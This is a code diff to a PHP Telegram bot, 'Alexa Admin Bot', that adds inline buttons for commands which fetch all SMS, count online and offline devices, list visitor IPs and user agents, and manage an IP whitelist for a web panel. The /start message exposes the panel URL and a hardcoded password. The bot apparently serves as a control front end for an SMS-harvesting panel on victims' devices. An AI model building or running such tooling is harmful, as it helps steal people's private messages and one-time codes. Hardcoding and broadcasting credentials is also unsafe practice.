@@ -57,17 +57,23 @@ if ($cbId) tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => '�
 
 // ====== COMMANDS ======
 if ($text === '/start') {
+  $kbd = ['inline_keyboard' => [
+    [['text' => '📊 Devices', 'callback_data' => '/devices'], ['text' => '💬 SMS', 'callback_data' => '/sms']],
+    [['text' => '📋 IP List', 'callback_data' => '/listips'], ['text' => '📡 Ping', 'callback_data' => '/ping']],
+    [['text' => '👁️ Visitors', 'callback_data' => '/visitors'], ['text' => '🌐 Panel', 'url' => 'https://alexa01-1.onrender.com/panel.php']]
+  ]];
   send($chatId, "🤖 <b>Alexa Admin Bot</b>\n\n"
     . "✅ Panel: https://alexa01-1.onrender.com/panel.php\n"
     . "🔑 Password: Alexa\n\n"
     . "📋 <b>Commands:</b>\n"
-    . "/addip &lt;ip&gt; - Add IP to whitelist\n"
+    . "/addip &lt;ip&gt; - Add IP\n"
     . "/removeip &lt;ip&gt; - Remove IP\n"
-    . "/listips - Show whitelisted IPs\n"
-    . "/devices - Online/Offline count\n"
-    . "/sms - Fetch all SMS\n"
+    . "/listips - Show IPs\n"
+    . "/devices - Online/Offline\n"
+    . "/sms - Fetch SMS\n"
     . "/ping - Panel ping\n"
-    . "/visitors - Recent visitor logs");
+    . "/visitors - Recent logs",
+    ['reply_markup' => json_encode($kbd)]);
   die('ok');
 }
 
@@ -102,7 +108,8 @@ if (preg_match('/^\/removeip (.+)$/', $text, $m)) {
 if ($text === '/listips') {
   if (!$allowedIPs) { send($chatId, "📋 <b>Whitelist</b>\n\nNo IPs. Use /addip &lt;ip&gt;"); die('ok'); }
   $l = ''; foreach ($allowedIPs as $i => $ip) $l .= ($i+1) . ". <code>$ip</code>\n";
-  send($chatId, "📋 <b>Whitelist</b> (" . count($allowedIPs) . ")\n\n$l");
+  send($chatId, "📋 <b>Whitelist</b> (" . count($allowedIPs) . ")\n\n$l",
+    ['reply_markup' => json_encode(['inline_keyboard' => [[['text' => '🔄 Refresh', 'callback_data' => '/listips']]]])]);
   die('ok');
 }
 
@@ -157,7 +164,8 @@ if ($text === '/sms') {
 if ($text === '/ping') {
   $s = microtime(true); fb('panel/allowed_ips');
   $ms = round((microtime(true) - $s) * 1000);
-  send($chatId, "📡 <b>Ping</b>\n⚡ {$ms}ms\n🐘 PHP " . PHP_VERSION . "\n🟢 Online");
+  send($chatId, "📡 <b>Ping</b>\n⚡ {$ms}ms\n🐘 PHP " . PHP_VERSION . "\n🟢 Online",
+    ['reply_markup' => json_encode(['inline_keyboard' => [[['text' => '🔄 Refresh', 'callback_data' => '/ping']]]])]);
   die('ok');
 }
 
@@ -173,7 +181,8 @@ if ($text === '/visitors') {
     $ua = htmlspecialchars(mb_substr($x['ua'] ?? '', 0, 25), ENT_QUOTES, 'UTF-8');
     $txt .= "$a <code>$ip</code>\n⏰ $t\n📱 $ua\n━━\n";
   }
-  send($chatId, $txt);
+  send($chatId, $txt,
+    ['reply_markup' => json_encode(['inline_keyboard' => [[['text' => '🔄 Refresh', 'callback_data' => '/visitors']]]])]);
   die('ok');
 }
 
